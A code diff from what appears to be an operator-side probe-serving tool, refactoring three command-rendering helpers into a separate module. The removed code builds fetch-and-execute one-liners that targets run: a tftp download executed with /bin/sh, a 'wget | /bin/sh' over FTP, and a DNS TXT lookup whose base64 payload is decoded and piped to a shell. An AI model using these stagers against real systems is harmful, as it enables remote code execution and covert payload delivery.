@@ -90,6 +90,9 @@ from gritlib.file_transfers import (
 from gritlib.ftp import ftp_pasv_reply_host, ftp_recv_line, ftp_send_line
 from gritlib.operator_io import clipboard_command, open_path_in_pager, viewable_path
 from gritlib.operator_network import local_ips, operator_advertised_host, target_visible_host
+from gritlib.probe_commands import (
+    render_probe_dns_command, render_probe_ftp_command, render_probe_tftp_command,
+)
 from gritlib.probe_results import append_probe_result, probe_results_path
 from gritlib.runtime import Service, ServiceManager, Session
 from gritlib.process_status import (
@@ -6637,15 +6640,6 @@ def serve_probe(cfg, timeout, max_sessions=0):
     return 0
 
 
-def render_probe_tftp_command(cfg, host=None, port=None):
-    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
-    safe_local_name = script_name.replace("'", "").replace("/", "_") or "probe.sh"
-    local_path = f"/tmp/{safe_local_name}"
-    direct_host = operator_advertised_host(cfg, host=host)
-    direct_port = int(port or cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
-    return f"tftp -g -r {shquote(script_name)} -l {shquote(local_path)} {shquote(direct_host)} {shquote(str(direct_port))} && /bin/sh {shquote(local_path)}"
-
-
 def serve_probe_tftp(cfg, timeout, max_sessions=0):
     service = "probe-tftp"
     port = int(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
@@ -6737,14 +6731,6 @@ def serve_probe_tftp(cfg, timeout, max_sessions=0):
             record_shutdown_event(cfg, service, session=log_dir)
             append_event(cfg, service, "service_stop", session=str(log_dir), details={"port": port, "protocol": "udp", "reason": stop_reason})
     return 0
-
-
-def render_probe_ftp_command(cfg, host=None, port=None):
-    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
-    direct_host = operator_advertised_host(cfg, host=host)
-    direct_port = int(port or cfg.get("GRIT_PROBE_FTP_PORT", 22209))
-    url = f"ftp://{direct_host}:{direct_port}/{script_name}"
-    return f"wget -O- {shquote(url)} | /bin/sh"
 
 
 def handle_probe_ftp_session(cfg, conn, addr, script_name, payload, log_dir, host):
@@ -6920,15 +6906,6 @@ def serve_probe_ftp(cfg, timeout, max_sessions=0):
             record_shutdown_event(cfg, service, session=log_dir)
             append_event(cfg, service, "service_stop", session=str(log_dir), details={"port": port, "protocol": "tcp", "reason": stop_reason})
     return 0
-
-
-def render_probe_dns_command(cfg, host=None, port=None):
-    dns_name = str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit")).strip().strip(".") or "probe.grit"
-    direct_host = operator_advertised_host(cfg, host=host)
-    direct_port = int(port or cfg.get("GRIT_PROBE_DNS_PORT", 22210))
-    if direct_port == 53:
-        return f"nslookup -type=TXT {shquote(dns_name)} {shquote(direct_host)} | sed -n 's/.*\"\\(.*\\)\".*/\\1/p' | tr -d '\\n' | base64 -d | /bin/sh"
-    return f"dig @{shquote(direct_host)} -p {shquote(str(direct_port))} +short TXT {shquote(dns_name)} | tr -d '\" \\n' | base64 -d | /bin/sh"
 
 
 def serve_probe_dns(cfg, timeout, max_sessions=0):
